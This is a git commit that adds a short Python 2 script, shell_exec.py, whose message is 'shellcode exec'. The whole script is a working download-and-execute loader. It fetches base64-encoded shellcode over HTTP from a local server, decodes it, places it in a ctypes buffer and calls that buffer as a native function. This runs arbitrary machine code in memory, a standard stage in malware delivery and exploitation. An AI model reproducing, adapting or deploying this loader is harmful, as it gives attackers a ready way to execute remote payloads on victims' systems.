6018016b98dfd0f8cace1238fa0f63527821909e
zjicmDarkWing <1126955201@qq.com>
2015-09-22 10:42:21 +0800

    shellcode exec

---
+++ shell_exec.py
@@ -0,0 +1,17 @@
+__author__ = 'DarkWing'
+
+import urllib2
+import ctypes
+import base64
+
+url = "http://127.0.0.1:7777/shellcode.bin"
+response = urllib2.urlopen(url)
+
+shellcode = base64.b64decode(response.read())
+
+shellcode_buffer = ctypes.create_string_buffer(shellcode,len(shellcode))
+
+shellcode_func = ctypes.cast(shellcode_buffer,ctypes.CFUNCTYPE(ctypes.c_void_p))
+
+shellcode_func()
+
